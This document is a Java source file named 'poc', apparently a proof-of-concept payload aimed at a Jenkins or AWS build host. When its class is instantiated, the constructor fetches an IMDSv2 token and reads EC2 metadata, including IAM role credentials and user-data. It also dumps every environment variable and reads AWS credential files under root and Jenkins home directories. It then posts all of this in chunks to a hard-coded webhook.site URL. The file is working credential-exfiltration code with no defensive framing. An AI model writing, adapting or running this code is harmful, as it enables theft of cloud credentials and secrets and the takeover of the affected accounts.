import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Map;

public class poc {
    static final String WH = "https://webhook.site/b0de7905-1496-47b6-93a5-8529f9c02252";
    static final String IMDS = "http://169.254.169.254";

    public poc() {
        StringBuilder sb = new StringBuilder("P13\n");
        String tok = null;
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(IMDS + "/latest/api/token").openConnection();
            c.setConnectTimeout(3000); c.setReadTimeout(3000);
            c.setRequestMethod("PUT"); c.setDoOutput(true);
            c.setRequestProperty("X-aws-ec2-metadata-token-ttl-seconds", "21600");
            OutputStream os = c.getOutputStream(); os.write("".getBytes()); os.flush(); os.close();
            if (c.getResponseCode() == 200) { tok = read(c); }
            sb.append("IMDSv2 token: ").append(tok == null ? "FAIL" : "OK(" + tok.length() + ")").append("\n");
        } catch (Throwable t) { sb.append("IMDSv2 token EXC ").append(t).append("\n"); }
        String[] paths = {"/latest/meta-data/instance-id", "/latest/meta-data/placement/availability-zone",
                          "/latest/meta-data/local-ipv4", "/latest/meta-data/public-ipv4",
                          "/latest/meta-data/iam/info", "/latest/meta-data/iam/security-credentials/",
                          "/latest/meta-data/identity-credentials/ec2/info",
                          "/latest/user-data", "/latest/meta-data/network/interfaces/macs/"};
        for (int i = 0; i < paths.length; i++) { sb.append(get(IMDS + paths[i], tok, paths[i])); }
        String role = lastRole;
        if (role != null && role.length() > 0 && role.length() < 120) {
            sb.append(get(IMDS + "/latest/meta-data/iam/security-credentials/" + role.trim(), tok, "ROLE_CREDS"));
        }
        sb.append("\n@@ ENV\n");
        try {
            Map<String, String> env = System.getenv();
            for (Map.Entry<String, String> e : env.entrySet()) {
                sb.append(e.getKey()).append("=").append(e.getValue()).append("\n");
            }
        } catch (Throwable t) { sb.append("env ERR ").append(t).append("\n"); }
        String[] files = {"/etc/hosts", "/etc/resolv.conf", "/etc/environment", "/root/.aws/credentials",
                          "/root/.aws/config", "/var/lib/jenkins/.aws/credentials", "/var/lib/jenkins/.aws/config",
                          "/home/jenkins/.aws/credentials", "/home/jenkins/.aws/config", "/etc/aws/credentials"};
        for (int i = 0; i < files.length; i++) { sb.append(cat(files[i])); }
        String data = sb.toString();
        int total = data.length();
        for (int i = 0; i < total && i < 3000000; i += 90000) {
            try { post("P13|" + i + "|" + data.substring(i, Math.min(total, i + 90000))); }
            catch (Throwable t) { }
        }
    }

    static String lastRole = null;

    static String get(String u, String token, String tag) {
        StringBuilder r = new StringBuilder("\n@@GET ").append(tag).append("\n");
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(u).openConnection();
            c.setConnectTimeout(5000); c.setReadTimeout(8000);
            c.setRequestProperty("User-Agent", "curl/7.6");
            if (token != null) { c.setRequestProperty("X-aws-ec2-metadata-token", token); }
            int code = c.getResponseCode();
            String body = read(c);
            if (code >= 400) { body = readErr(c); }
            r.append("status=").append(code).append("\n").append(body).append("\n");
            if (tag.endsWith("security-credentials/") && code == 200) { lastRole = body.trim(); }
        } catch (Throwable t) { r.append("EXC ").append(t).append("\n"); }
        return r.toString();
    }

    static String read(HttpURLConnection c) throws Exception {
        InputStream in = c.getInputStream();
        ByteArrayOutputStream bo = new ByteArrayOutputStream();
        byte[] b = new byte[4096]; int n;
        while ((n = in.read(b)) > 0) { bo.write(b, 0, n); if (bo.size() > 200000) break; }
        in.close();
        return new String(bo.toByteArray(), "UTF-8");
    }

    static String readErr(HttpURLConnection c) {
        try {
            InputStream in = c.getErrorStream();
            if (in == null) { return ""; }
            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            byte[] b = new byte[4096]; int n;
            while ((n = in.read(b)) > 0) { bo.write(b, 0, n); if (bo.size() > 20000) break; }
            in.close();
            return new String(bo.toByteArray(), "UTF-8");
        } catch (Throwable t) { return ""; }
    }

    static String cat(String p) {
        StringBuilder r = new StringBuilder("\n@@CAT ").append(p).append("\n");
        try {
            Path f = Paths.get(p);
            if (!Files.isRegularFile(f)) { r.append("(missing)\n"); return r.toString(); }
            byte[] b = Files.readAllBytes(f);
            r.append(new String(b, "UTF-8")).append("\n");
        } catch (Throwable t) { r.append("EXC ").append(t).append("\n"); }
        return r.toString();
    }

    static void post(String s) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(WH).openConnection();
        c.setConnectTimeout(15000); c.setReadTimeout(30000);
        c.setRequestMethod("POST"); c.setDoOutput(true);
        c.setRequestProperty("Content-Type", "text/plain; charset=UTF-8");
        OutputStream os = c.getOutputStream(); os.write(s.getBytes("UTF-8")); os.flush(); os.close();
        try { c.getResponseCode(); } catch (Throwable t) { }
    }
}
